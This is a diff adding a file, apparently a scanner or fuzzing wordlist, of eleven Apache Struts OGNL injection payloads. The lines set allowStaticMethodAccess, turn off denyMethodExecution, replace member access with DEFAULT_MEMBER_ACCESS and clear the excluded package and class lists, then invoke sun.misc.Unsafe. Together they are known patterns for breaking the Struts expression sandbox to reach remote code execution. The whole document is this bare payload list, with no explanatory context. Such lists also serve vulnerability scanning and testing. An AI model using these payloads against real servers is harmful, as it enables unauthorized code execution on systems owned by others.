@@ -1,0 +1,11 @@
+%{#_memberAccess.allowStaticMethodAccess=false,#context["xwork.MethodAccessor.denyMethodExecution"]=true,@sun.misc.Unsafe@getUnsafe()}
+%{#_memberAccess.a=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#_memberAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#a.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#a=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#_memberAccess["a"]=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{#_memberAccess.allowStaticMethodAccess=true,@sun.misc.Unsafe@getUnsafe()}
+%{#_memberAccess["allowStaticMethodAccess"]=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{(@sun.misc.Unsafe@getUnsafe()).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#context['xwork.MethodAccessor.denyMethodExecution']=false).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))}
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#context['xwork.MethodAccessor.denyMethodExecution']=false).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@sun.misc.Unsafe@getUnsafe())}
